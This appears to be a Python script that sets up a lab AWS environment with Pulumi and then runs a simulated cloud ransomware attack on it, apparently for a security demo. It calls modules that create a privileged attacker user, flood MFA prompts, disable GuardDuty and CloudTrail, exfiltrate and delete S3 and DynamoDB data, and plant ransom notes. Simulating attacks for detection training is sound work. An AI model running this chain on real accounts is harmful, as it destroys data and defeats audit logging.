import os
import subprocess
import json
import time
import random
import string
from tqdm import tqdm
from time import sleep
from termcolor import colored
import Functions
from Helpers import loading_animation
import pyqrcode
from clean_up import full_cleanup
import pulumi
import pulumi_aws as aws
import boto3
from attack import Attack
from MFA import MFASetup
from Load_Pulumi_Outputs import get_pulumi_output
from ransomware import Ransomware


# Initialize AWS Clients 
iam_client = boto3.client("iam")
sts_client = boto3.client("sts")

PULUMI_OUTPUT_PATH = "/workspaces/Pulumi/Infra/forrester-2025-output.json"

# # Dynamically fetching DevopsUser from Pulumi Outputs
# #user = "DevopsUser"
# user_arn = get_pulumi_output("devops_user_arn")
# user = user_arn.split("/")[-1]  # Extracts the username
# print(f"DEBUG: Extracted IAM Username: {user}") 

# mfa_arn = ""

# #Create MFASetup instance with required parameters
# mfa = MFASetup(user, mfa_arn, iam_client, sts_client, PULUMI_OUTPUT_PATH)



def forrester_scenario_execute():
    """ Execute Pulumi Deployment for the Forrester 2025 Attack Scenario"""

    print("-" * 30)
    print(colored("Executing Forrester 2025 Scenario: Compromise DevOps User, takeover, priv escalation, perform ransomware on S3 & DynamoDB", color="red"))
    loading_animation()
    print("-" * 30)

    print(colored("Rolling out Infrastructure via Pulumi", color="red"))
    loading_animation()
    print("-" * 30)

    file_path = "/workspaces/Pulumi/Infra/forrester-2025-output.json"

    #  Ensure Previous Pulumi Output is Removed
    if os.path.exists(file_path):
        os.remove(file_path)
        print(f" Previous Pulumi output file '{file_path}' found and deleted.")
    else:
        print(f" Pulumi output file '{file_path}' not found, proceeding...")

    #  Execute Pulumi Deployment
    # Change current working directory to 'Infra'
    os.chdir("/workspaces/Pulumi/Infra/")
    subprocess.call("pulumi up -s dev -y", shell=True)

    #  Capture Pulumi Stack Output
    subprocess.call("pulumi stack -s dev output --json > /workspaces/Pulumi/Infra/forrester-2025-output.json", shell=True)
    print(" Pulumi output saved inside /workspaces/Pulumi/Infra/forrester-2025-output.json")




def forrester_scenario_validate_rollout():
    """ Validate that Pulumi successfully deployed all resources"""

    Functions.wait_for_output_file()
    Functions.validate_pulumi_outputs_after_rollout(pulumi_stack_output_file="/workspaces/Pulumi/Infra/forrester-2025-output.json")




def forrester_scenario_validate_data():
    """ Validate that Pulumi-created data exists in S3 and DynamoDB"""

    print("\n Running Post-Deployment Validation Checks...")

    # Ensure Pulumi Stack Output is Up to Date
    subprocess.run("pulumi stack -s dev output --json > /workspaces/Pulumi/Infra/forrester-2025-output.json", shell=True)

    # Load Pulumi Outputs
    with open("/workspaces/Pulumi/Infra/forrester-2025-output.json", "r") as file:
        outputs = json.load(file)

    # Validate S3 Buckets
    s3_buckets = [
        outputs["config_files_bucket"],
        outputs["customer_data_bucket"],
        outputs["payment_data_bucket"]
    ]

    for bucket in s3_buckets:
        validation_cmd = f"aws s3 ls s3://{bucket} --region us-east-1"
        result = subprocess.run(validation_cmd, shell=True, capture_output=True, text=True)

        if result.stdout:
            print(f"S3 Validation Passed: Data exists in bucket {bucket}")
        else:
            print(f"ERROR: No data found in {bucket}")

    # Validate DynamoDB Tables
    dynamodb_tables = ["CustomerOrdersTable", "CustomerSSNTable"]

    for table in dynamodb_tables:
        validation_cmd = f"aws dynamodb scan --table-name {outputs[table]} --region us-east-1 --limit 1"
        result = subprocess.run(validation_cmd, shell=True, capture_output=True, text=True)

        if '"Items"' in result.stdout:
            print(f"DynamoDB Validation Passed: Records found in {outputs[table]}")
        else:
            print(f"ERROR: No records found in {outputs[table]}")

    print("\nPost-Deployment Data Validation Complete!")





def ensure_pulumi_deployment():
    """Ensures Pulumi infrastructure is deployed before Attack initialization"""
    
    print("Starting Infrastructure Deployment...")

    print("\nExecuting Pulumi Deployment...")
    forrester_scenario_execute()

    print("\nValidating Rollout...")
    forrester_scenario_validate_rollout()

    print("\nValidating Data...")
    forrester_scenario_validate_data()

    # Wait for the Pulumi output file to be generated
    # timeout = 60  # Max 60 seconds
    # elapsed = 0
    # while not os.path.exists(PULUMI_OUTPUT_PATH) and elapsed < timeout:
    #     time.sleep(3)
    #     elapsed += 3

    if not os.path.exists(PULUMI_OUTPUT_PATH):
        raise RuntimeError(f"ERROR: Pulumi output file '{PULUMI_OUTPUT_PATH}' still not found after deployment.")

    print("\nPulumi Deployment Verified! Proceeding...\n")

    # Let MFA fully register before trying to login
    Functions.progress_bar(seconds=15)






if __name__ == "__main__":
    # print("Starting Infrastructure Deployment...")

    #time.sleep(300)

    print("\n\n\n") 
    print("Executing Pulumi Deployment...")
    print("\n\n\n")
    forrester_scenario_execute()

    print("\n\n\n") 
    print("Validating Rollout...")
    print("\n\n\n")
    forrester_scenario_validate_rollout()

    print("\n\n\n") 
    print("Validating Data Population Within Infrastructure for EC2 & DynamoDB")
    print("\n\n\n")
    forrester_scenario_validate_data()


    print("\n\n\n") 
    print("Setting up MFA for DevOpsUser and getting a session token")
    print("\n\n\n")
    # Dynamically fetching DevopsUser from Pulumi Outputs
    user_arn = get_pulumi_output("devops_user_arn")
    user = user_arn.split("/")[-1]  # Extracts the username
    print(f"DEBUG: Extracted IAM Username: {user}") 

    mfa_arn = ""

    #Create MFASetup instance with required parameters
    mfa = MFASetup(user, mfa_arn, iam_client, sts_client, PULUMI_OUTPUT_PATH)
    mfa.setup_mfa_and_login()


    # devops_users = ["DevopsDeploy", "DevopsAutomation", "DevopsMonitor", "DevopsPipeline", "DevopsUser"]
    
    # # Loop through all DevOps users and setup MFA for each
    # for user in devops_users:
    #     mfa_arn = get_pulumi_output(f"{user}_mfa_arn")  # Fetch MFA ARN dynamically
    #     if "ERROR" in mfa_arn:
    #         print(f"Skipping {user}, no MFA ARN found.")
    #         continue  # Skip user if MFA ARN is not found
        
    #     print(f"\n\n🚀 Setting up MFA and retrieving a session token for {user}...\n\n")
    #     mfa = MFASetup(user, mfa_arn, iam_client, sts_client, get_pulumi_output)
    #     mfa.setup_mfa_and_login()



#   _____                            _    _               
#  |  __ \                          | |  | |              
#  | |  | | _____   _____  _ __  ___| |  | |___  ___ _ __ 
#  | |  | |/ _ \ \ / / _ \| '_ \/ __| |  | / __|/ _ \ '__|
#  | |__| |  __/\ V / (_) | |_) \__ \ |__| \__ \  __/ |   
#  |_____/ \___| \_/ \___/| .__/|___/\____/|___/\___|_|   
#                         | |                             
#                         |_|                                                      
    print("\n\n\n") 
    print("Enumerating on all AWS resoureces and saving to ./AWS_Emumeration")
    print("\n\n\n") 
    attack = Attack()
    attack.enumeration.run_all_enumerations()
    

    print("\n\n\n")
    print("\n DevopsUser creating new user: `run_while_u_can` and obtaining new credentials...")
    print("\n\n\n")
    #####################################################
    ### DevopsUser creating Ransomware user, access keys
    ### &  attaching AWS s3/Dynamodb all access policies
    ### for exfiltration --> deletion --> ransomware note
    #####################################################

    def generate_unique_username(base_name="run_while_u_can", length=6):
        random_suffix = ''.join(random.choices(string.digits, k=length))
        return f"{base_name}_{random_suffix}"
    
    user_name = generate_unique_username()
    ransomware_access_keys = attack.createuser_attatchpolicies.run_pipeline(
        username=user_name,
        policy_arns=[
            "arn:aws:iam::aws:policy/AmazonDynamoDBFullAccess",
            "arn:aws:iam::aws:policy/AmazonS3FullAccess"
        ]
    )


    access_key, secret_key = ransomware_access_keys[0][0], ransomware_access_keys[1][0]
    print(f"{user_name} Access Key: {access_key}")
    print(f"{user_name} Secret Key: {secret_key}")



 
#                             _     _ _                                            
#                            | |   (_) |                                           
#   _ __ _   _ _ __ __      _| |__  _| | ___    _   _  ___  _   _   ___ __ _ _ __  
#  | '__| | | | '_ \\ \ /\ / / '_ \| | |/ _ \  | | | |/ _ \| | | | / __/ _` | '_ \ 
#  | |  | |_| | | | |\ V  V /| | | | | |  __/  | |_| | (_) | |_| || (_| (_| | | | |
#  |_|   \__,_|_| |_| \_/\_/ |_| |_|_|_|\___|   \__, |\___/ \__,_| \___\__,_|_| |_|
#                 ______                  ______ __/ |         ______              
#                |______|                |______|___/         |______|             

    #######################################################
    # User:run_while_you_can boto3 session initialization #
    #######################################################
    ransomware = Ransomware(access_key,secret_key)
    ransomware.session_test()

    ransomware.devops_team_MFA_DDOS()
    Functions.attack_execution_duration(seconds=30, description="Do MFA DDOS on devops team and wait 30 seconds")

    ransomware.disable_guardduty()
    ransomware.delete_guardduty()
    Functions.attack_execution_duration(seconds=30, description="Disable & Delete Guard duty then wait 30 seconds")

    ransomware.stop_cloudtrail_logging()
    ransomware.delete_cloudtrail()
    Functions.attack_execution_duration(seconds=30, description="Disable & Delete Cloudtrail then wait 30 seconds")



#      ____    _  _   _           _   
#   __|__ /   /_\| |_| |_ __ _ __| |__
#  (_-<|_ \  / _ \  _|  _/ _` / _| / /
#  /__/___/ /_/ \_\__|\__\__,_\__|_\_\
    # ransomware.s3_drain.search_and_exfiltrate()
    # Functions.attack_execution_duration(seconds=30, description="s3 Drain then wait 30 seconds")

    ransomware.s3_drain.exfiltrate()
    Functions.attack_execution_duration(seconds=15, description="s3 Exfil then wait 15 sec...")
    ransomware.s3_drain.delete_objects()
    Functions.attack_execution_duration(seconds=15, description="s3 Delete then wait 15 sec...")
    ransomware.s3_drain.place_ransom_note()

    ### Pause between s3 & DynamoDB to generate chronological alerts for CRISP story telling ###
    Functions.attack_execution_duration(seconds=30, description="s3 Attack vector finished... waiting 30 sec to commence DynamoDB vector")

#   ___                           ___  ___     _  _   _           _   
#  |   \ _  _ _ _  __ _ _ __  ___|   \| _ )   /_\| |_| |_ __ _ __| |__
#  | |) | || | ' \/ _` | '  \/ _ \ |) | _ \  / _ \  _|  _/ _` / _| / /
#  |___/ \_, |_||_\__,_|_|_|_\___/___/|___/ /_/ \_\__|\__\__,_\__|_\_\
#        |__/                                                         
    #ransomware.dynamodb_drain.search_and_exfiltrate()
    ransomware.dynamodb_drain.exfiltrate()
    Functions.attack_execution_duration(seconds=15, description="DynamoDB Exfil then wait 15 sec...")

    ransomware.dynamodb_drain.delete_tables()
    Functions.attack_execution_duration(seconds=15, description="DynamoDB Delete Tables then wait 15 sec...")

    ransomware.dynamodb_drain.create_ransom_table()
    Functions.attack_execution_duration(seconds=15, description="DynamoDB Create Ransom Table then wait 15 sec...")

    ransomware.dynamodb_drain.insert_ransom_note()

